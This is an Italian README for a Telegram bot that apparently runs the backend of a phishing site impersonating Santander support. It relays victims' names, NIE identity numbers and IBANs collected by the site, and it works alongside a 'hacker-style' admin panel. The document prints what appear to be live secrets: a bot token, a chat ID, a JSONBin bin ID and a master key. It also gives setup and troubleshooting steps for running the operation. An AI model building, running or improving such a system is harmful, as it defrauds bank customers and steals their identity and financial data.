# 🤖 Bot Telegram Santander Support System

## Configurazione

Il bot Telegram è stato configurato con i seguenti parametri:

| Parametro | Valore |
|-----------|--------|
| **Bot Token** | `8769459139:AAFTZL5K-rk7dHAngP8NfcdG0S4OjcOCGZw` |
| **Chat ID** | `8379210056` |
| **BIN ID (JSONBin)** | `69c501f6c3097a1dd5605779` |
| **Master Key** | `$2a$10$RoiwGd894wsPzcL0d6AYtegWuH4z7zN1P09knFoJ/sP6fOaecTzm.` |

## Installazione

### 1. Installare le dipendenze

```bash
pip install python-telegram-bot requests
```

### 2. Avviare il bot

```bash
python3 telegram_bot_advanced.py
```

## Comandi disponibili

### Comandi principali

- **/start** - Menu principale con opzioni
- **/help** - Mostra l'aiuto
- **/pending** - Visualizza sessioni pendenti
- **/all** - Visualizza tutte le sessioni
- **/stats** - Mostra statistiche
- **/refresh** - Aggiorna i dati

### Menu interattivo

Il bot fornisce un menu interattivo con pulsanti inline:

- 📋 **Sessioni Pendenti** - Elenca le registrazioni in attesa
- ✅ **Tutte le Sessioni** - Mostra tutte le sessioni
- 📊 **Statistiche** - Visualizza statistiche del sistema
- ⚙️ **Impostazioni** - Mostra le impostazioni

## Funzionalità

### 1. Monitoraggio in tempo reale

Il bot monitora costantemente JSONBin.io e invia notifiche quando:
- Una nuova sessione viene registrata
- Lo stato di una sessione cambia
- Vengono aggiunti IBAN e procurador

### 2. Gestione sessioni

Puoi gestire le sessioni direttamente dal bot:
- Visualizzare i dettagli di ogni sessione
- Inviare IBAN e procurador
- Eliminare sessioni

### 3. Statistiche

Il bot fornisce statistiche in tempo reale:
- Numero totale di sessioni
- Sessioni pendenti
- Sessioni completate

## Sincronizzazione con JSONBin.io

Il bot sincronizza automaticamente con JSONBin.io:

```
┌─────────────────────┐
│  Sito Web Santander │
│  (cuenta-soporte)   │
└──────────┬──────────┘
           │
           ▼
    ┌─────────────┐
    │  JSONBin.io │
    │  (BIN_ID)   │
    └──────┬──────┘
           │
           ▼
    ┌──────────────┐
    │ Bot Telegram │
    │  (Notifiche) │
    └──────────────┘
```

## Schema dati JSONBin

Ogni sessione contiene:

```json
{
  "id": "unique_session_id",
  "nombre": "Juan",
  "apellidos": "Garcia Lopez",
  "nie": "12345678A",
  "status": "pending|ready",
  "timestamp": "26/3/2026, 10:30:00",
  "ua": "Mozilla/5.0...",
  "iban": "ES91 1234 5678 1234 5678 9012",
  "proc_nombre": "Carlos",
  "proc_apellidos": "Rodriguez"
}
```

## Notifiche

Il bot invia notifiche per:

- 🔔 **Nuova sessione** - Quando un utente si registra
- ✓ **Sessione completata** - Quando IBAN e procurador vengono assegnati
- ⚠️ **Errori** - Se ci sono problemi di sincronizzazione

## Troubleshooting

### Il bot non riceve notifiche

1. Verifica che il token sia corretto
2. Verifica che il Chat ID sia corretto
3. Assicurati che il bot sia avviato
4. Controlla la connessione a JSONBin.io

### JSONBin.io restituisce errore 401

- Verifica che la Master Key sia corretta
- Assicurati di usare l'header `X-Master-Key` (non `X-Access-Key`)

### Il bot non si connette

- Verifica la connessione internet
- Controlla il token Telegram
- Assicurati che il bot sia stato creato su BotFather

## Integrazione con il pannello admin

Il bot Telegram e il pannello admin (admin.html) condividono lo stesso JSONBin.io:

- **Pannello admin**: Interfaccia web hacker-style (nero/verde)
- **Bot Telegram**: Interfaccia mobile/chat

Entrambi sincronizzano in tempo reale le sessioni e i dati.

## Sicurezza

- La Master Key è protetta nel codice
- Usa variabili d'ambiente in produzione
- Il bot ha accesso solo al Chat ID specificato
- JSONBin.io usa HTTPS per tutte le comunicazioni

## Supporto

Per problemi o domande, contatta l'amministratore del sistema.
